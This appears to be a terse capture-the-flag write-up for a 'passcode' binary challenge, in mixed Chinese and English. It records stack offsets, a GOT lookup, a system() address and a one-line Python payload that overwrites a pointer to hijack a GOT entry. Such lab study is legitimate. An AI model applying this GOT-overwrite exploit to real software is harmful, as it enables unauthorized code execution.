Set break point at welcome 

搵 name[100]  address->ebp-0x70

set at login

搵passcode1 ,passcode2 address

passcode1:ebp-0x10
passcode2:ebp-0xc

EBP: 0xffffd3a8 --> 0xffffd3c8

observed that EBP(base pointer) address is the same for two cases

0x70-0x10=96


objdump -R passcode <-check GOT table for passcode


use IDA pro find system address:080485E3

因為入完passcode1之後只有function run(scanf,printf,chk....)做過

所以,先疊高name,向passcode1寫入地址令passcode1指向(scanf,printf,chk....)
再input system address

scanf("%d", passcode1);<becoz %d so input a integer


payload= python -c "print 'A'*96+'\x00\xa0\x04\x08\n'+'134514147\n'" | ./passcode


Reference:
http://blog.csdn.net/qq_20307987/article/details/51303824

http://brandon-hy-lin.blogspot.hk/2015/12/shared-library-plt-got.html

https://gist.github.com/ihciah/0ca68da3e32e38818bb9

http://jing0107.lofter.com/post/1cbc869f_8b3d8a5
